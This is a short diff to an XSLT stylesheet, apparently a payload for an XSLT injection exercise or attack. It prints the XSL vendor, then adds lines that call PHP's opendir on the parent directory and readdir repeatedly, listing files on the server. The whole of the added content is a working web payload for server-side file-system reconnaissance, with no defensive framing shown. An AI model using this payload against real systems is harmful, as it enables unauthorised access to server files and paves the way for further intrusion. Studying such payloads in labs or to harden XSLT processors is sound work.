@@ -4,6 +4,16 @@
     <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <p>
     <xsl:value-of select="system-property('xsl:vendor')"/>
+    <xsl:value-of select="php:function('opendir','../')"/>
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
     </p>
 </body>
 </html> 
